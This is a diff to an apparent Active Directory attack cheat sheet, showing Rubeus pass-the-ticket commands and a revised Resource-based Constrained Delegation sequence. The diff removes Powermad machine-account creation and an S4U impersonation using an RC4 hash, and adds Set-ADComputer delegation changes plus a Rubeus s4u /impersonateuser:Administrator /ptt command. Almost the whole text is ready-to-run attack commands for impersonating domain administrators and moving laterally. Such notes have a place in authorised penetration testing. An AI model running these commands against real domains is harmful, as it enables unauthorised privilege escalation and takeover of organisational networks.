@@ -40,14 +40,15 @@ execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\Sy
 execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
 ```
 ### Resource-based Constrained Delegation
-service administrators/owners can configure which domain accounts are allowed to delegate to them.
+
 ```
-Import-Module .\Powermad.psd1
-New-MachineAccount -Domain insomnia.io -DomainController 192.168.100.1 -MachineAccount Evil_genius -Password (ConvertTo-SecureString 'Password!@#' -AsPlainText -Force) -Verbose
-Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll
-Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
-Set-ADComputer ops-sqlsrvone -PrincipalsAllowedToDelegateToAccount Evil_genius$ -Verbose
-Rubeus.exe s4u /user:Evil_genius$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/opssqlsrvone /impersonateuser:Administrator /ptt
-Enter-PSSession -ComputerName ops-sqlsrvone
+Import-Module .\ADModule-master\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+Import-Module .\ADModule-master\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+
+Set-ADComputer -Identity Targeted-Machine -PrincipalsAllowedToDelegateToAccount Compromised-Machine$ -Verbose
+Set-ADComputer -Identity FS01 -PrincipalsAllowedToDelegateToAccount john.insomnia$ -Verbose
+Rubeus.exe s4u /user:john.insomnia$ /aes256:<AES256 Key> /msdsspn:time/John-PC$ /impersonateuser:Administrator /ptt
+rubeus.exe  ptt /ticket:<>
+
 ```
 
